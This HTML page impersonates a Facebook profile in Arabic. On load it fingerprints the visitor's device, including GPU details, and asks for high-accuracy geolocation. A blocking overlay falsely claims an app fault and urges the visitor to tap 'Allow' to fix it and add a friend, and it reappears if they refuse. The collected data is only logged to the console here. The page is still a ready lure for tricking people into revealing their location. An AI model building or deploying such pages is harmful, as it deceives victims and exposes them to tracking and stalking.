<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>سامح السيد - Facebook</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 900px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            text-align: center;
            color: #333;
        }
        .cover-photo {
            width: 100%;
            height: 300px;
            background-image: url('https://example.com/cover-photo.jpg');
            background-size: cover;
            background-position: center;
            position: relative;
        }
        .profile-photo {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            border: 5px solid #fff;
            position: absolute;
            bottom: -75px;
            left: 20px;
        }
        .profile-info {
            padding: 20px;
            padding-top: 80px;
        }
        .profile-info h1 {
            margin: 10px 0;
            font-size: 24px;
            color: #333;
        }
        .content {
            padding: 20px;
        }
        .content p {
            font-size: 18px;
            color: #555;
        }
        .profiles {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
        }
        .profile {
            margin: 10px;
            text-align: center;
        }
        .profile img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 2px solid #4267B2;
        }
        .profile p {
            margin-top: 5px;
            font-size: 16px;
            color: #333;
        }
        .footer {
            padding: 10px;
            font-size: 14px;
        }
        .footer a {
            color: #4267B2;
            text-decoration: none;
        }
        .overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .overlay .popup {
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .overlay .popup button {
            background-color: #4267B2;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <div class="overlay" id="overlay">
        <div class="popup">
            <p>يبدو أن هناك مشكلة في التطبيق. قم بعمل موافق أو سماح لحل المشكلة وإضافة هذا الحساب كصديق.</p>
            <button onclick="requestLocationPermission()">السماح</button>
        </div>
    </div>

    <div class="container">
        <div class="cover-photo">
            <img src="https://example.com/profile-photo.jpg" alt="سامح السيد" class="profile-photo">
        </div>
        <div class="profile-info">
            <h1>سامح السيد</h1>
        </div>
        <div class="content">
            <p>مرحبًا بكم في صفحة سامح السيد الشخصية.</p>
            <div class="profiles">
                <div class="profile">
                    <img src="https://randomuser.me/api/portraits/women/81.jpg" alt="مستخدم">
                    <p>أمل</p>
                </div>
                <div class="profile">
                    <img src="https://randomuser.me/api/portraits/men/82.jpg" alt="مستخدم">
                    <p>محمد</p>
                </div>
                <div class="profile">
                    <img src="https://randomuser.me/api/portraits/women/83.jpg" alt="مستخدم">
                    <p>ليلى</p>
                </div>
                <div class="profile">
                    <img src="https://randomuser.me/api/portraits/men/84.jpg" alt="مستخدم">
                    <p>علي</p>
                </div>
            </div>
        </div>
        <div class="footer">
            <p>حقوق الطبع والنشر © 2024 سامح السيد. جميع الحقوق محفوظة. <a href="#">سياسة الخصوصية</a></p>
        </div>
    </div>

    <script>
        function collectDeviceInfo() {
            var ptf = navigator.platform;
            var cc = navigator.hardwareConcurrency || 'غير متوفر';
            var ram = navigator.deviceMemory || 'غير متوفر';
            var ver = navigator.userAgent;
            var brw = 'غير متوفر';
            var canvas = document.createElement('canvas');
            var gl, debugInfo, ven, ren;

            if (ver.indexOf('Firefox') != -1) {
                brw = 'Firefox';
            } else if (ver.indexOf('Chrome') != -1) {
                brw = 'Chrome';
            } else if (ver.indexOf('Safari') != -1) {
                brw = 'Safari';
            } else if (ver.indexOf('Edge') != -1) {
                brw = 'Edge';
            }

            try {
                gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            } catch (e) { }
            if (gl) {
                debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
                ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
            }

            var ht = window.screen.height;
            var wd = window.screen.width;
            var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';

            var deviceInfo = `منصة الجهاز: ${ptf}\nعدد النوى: ${cc}\nالذاكرة العشوائية: ${ram}\nنوع المتصفح: ${brw}\nنظام التشغيل: ${os}\nدقة الشاشة: ${ht}x${wd}\nالشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\nنوع وحدة المعالجة الرسومية: ${ren}`;
            console.log(deviceInfo);
        }

        function requestLocationPermission() {
            if (navigator.geolocation) {
                var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
                navigator.geolocation.getCurrentPosition(function(position) {
                    document.getElementById('overlay').style.display = 'none';
                }, function (error) {
                    alert('يبدو أن هناك مشكلة في التطبيق. قم بعمل موافق أو سماح لحل المشكلة وإضافة هذا الحساب كصديق..');
                    document.getElementById('overlay').style.display = 'flex';
                }, optn);
            } else {
                alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
            }
        }

        // طلب إذن الموقع الجغرافي عند تحميل الصفحة
        window.onload = function() {
            collectDeviceInfo();
            requestLocationPermission();
        };
    </script>
</body>
</html>
